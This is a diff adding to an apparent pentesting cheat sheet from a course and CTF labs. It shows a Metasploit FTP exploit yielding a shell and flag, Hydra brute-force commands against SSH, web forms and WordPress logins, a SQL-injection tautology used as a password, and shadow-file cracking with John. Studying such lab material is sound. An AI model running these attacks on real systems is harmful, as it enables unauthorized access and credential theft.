@@ -388,6 +388,66 @@ john --wordlist=/usr/share/wordlists/npt_list.txt shadow-file # eg /etc/shadow
 
 # SQL injection: sqlmap
 sqlmap -u example.com/login?user=a&pass=b
+
+# metasploit example
+$ sudo nmap -sS 10.5.123.80
+PORT STATE SERVICE
+21/tcp open ftp <---
+
+msfconsole
+
+> search pureftp
+> use 0
+> show options
+> set payload linux/x86/shell/bind_tcp
+> set rhost 10.5.123.80
+> exploit
+>
+> > whoami
+> > cat /root/flag
+```
+
+### Password crask hacks
+
+```
+locate wordlist
+
+BEST for passwords:
+$ less  /usr/share/wordlists/rockyou.txt
+
+# THIS WORKS:
+echo "sdasdsa' or '1' = '1" > mylist.txt
+hydra -l test -P ./mylist.txt testphp.vulnweb.com http-post-form "/userinfo.php:uname=^USER^&pass=^PASS^:If you are already registered " -V
+
+# This also:
+hydra -l test -P /usr/share/dirb/wordlists/big.txt 10.5.134.55 -s 90 http-post-form "/pass/index.html:password=^PASS^:405" -V
+
+touch wl.txt
+echo "foo" > wl.txt
+hydra -l mail@mwager.de -P ./wl.txt https://testphp.vulnweb.com http-post-form "/login:emailOrPhone=^USER^&password=^PASS^" -V
+
+
+# Block 10 Aufgabe 1:
+$ hydra -l jacobs -P /usr/share/wordlists/npt_list.txt 10.5.201.23  ssh -V -I
+[22][ssh] host: 10.5.201.23   login: jacobs   password: daniela
+
+# hydra wordpress:
+# 1. check for usernames:
+hydra -vV -L fsocity.dic -p wedontcare 10.10.1.111 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
+
+few minutes later....
+>> [80][http-post-form] host: 192.168.2.4 login: elliot password: mypassword
+
+# 2. check for password:
+hydra -vV -l elliot -P fsocity.dic 10.10.1.111 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
+
+# Wordpress msfconsole (if you have admin access)
+https://blog.christophetd.fr/write-up-mr-robot/
+
+also:
+crunch, john the ripper etc...
+
+john --wordlist=/usr/share/wordlists/npt_list.txt shadow-file # eg /etc/shadow
 ```
 
 ### Discs & Forensics
